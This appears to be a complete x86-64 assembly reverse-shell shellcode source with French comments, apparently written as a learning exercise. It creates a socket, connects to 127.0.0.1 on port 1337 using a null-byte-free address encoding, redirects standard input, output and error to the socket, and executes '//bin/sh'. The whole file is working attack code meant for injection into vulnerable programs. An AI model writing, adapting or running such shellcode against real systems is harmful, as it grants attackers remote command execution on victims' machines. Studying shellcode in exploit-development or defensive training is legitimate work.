BITS 64

section .data
section .text

global _start

_start:

    ;création du sys_socket 41
    ; int socket(int domain, int type, int protocol);
    xor rdi, rdi        ;clear rdi
    xor rsi, rsi        ;clear rsi
    xor rdx, rdx        ;clear rdx
    xor rax, rax        ;clear rax

    ;param1
    mov dil, 0x2        ;famille du socket

    ;param2
    mov sil, 0x1        ;type du socket

    ;param3
    ;mov rdx, 0x4        ;protocole du socket ipv4

    mov al, 41     ;on appelle le sys_socket
    syscall

    mov r12, rax
    ;création du sys_connect 42

    ;param1
    mov rdi, r12    ;récupération du fd fourni par le sys_socket

    xor rsi, rsi        ;clear rsi
    xor rdx, rdx        ;clear rdx
    xor rax, rax        ;clear rax

    ;param2
    mov esi, 0xffffffff ;création de l'adresse ip
    sub esi, 0xfeffff80
    push rsi
    push word 0x3905      ;port 1337 en little Endian
    push word 0x2        ;type family
    mov rsi, rsp
 

    ;param3
    mov dl, 24      ;set taille de l'@ ip

    mov al, 42         ;on appelle le sys_connect
    syscall


    ;paramétrage sys_dup2

    ;sortie0
    xor rsi, rsi 
    xor rax, rax
    mov rdi, r12    ;récupération du fd fourni par le sys_socket
    mov sil, 0xFF   ;redirection sortie 0 vers rdi (stream)
    sub sil, 0xFF

    mov al, 33
    syscall

    ;sortie1
    xor rsi, rsi 
    xor rax, rax

    mov rdi, r12    ;récupération du fd fourni par le sys_socket
    mov sil, 0x1   ;redirection sortie 1 vers rdi (stream)


    mov al, 33
    syscall

    ;sortie2
    xor rsi, rsi 
    xor rax, rax

    mov rdi, r12    ;récupération du fd fourni par le sys_socket
    mov sil, 0x2   ;redirection sortie 2 vers rdi (stream)

    mov al, 33
    syscall


    ; 59 opcode
    ; int execve(char *fname, char **argp, char **envp);
    xor eax, eax
    xor rdi, rdi        ;Zero rdi
    xor rdx, rdx        ;Zero rdx
    xor rsi, rsi        ;Zero rsi
    mov rdi, 0x68732f6e69622f2f             ;string to rdi "//bin/sh" hex & little endian
    push rdx            ; délimiteur de stack à 0
    push rdi            ; insertion chaine /bin/sh en stack
    mov rdi, rsp        ; insertion du pointeur de stack dans rdi
    push rdx            ; délimiteur de stack à 0
    push rdi            ; insertion du pointeur dans la stack
    mov rsi, rsp        ; récupération du pointeur de pointeur et mise dans rsi

    add eax, 59        ;execve opcode

    syscall
    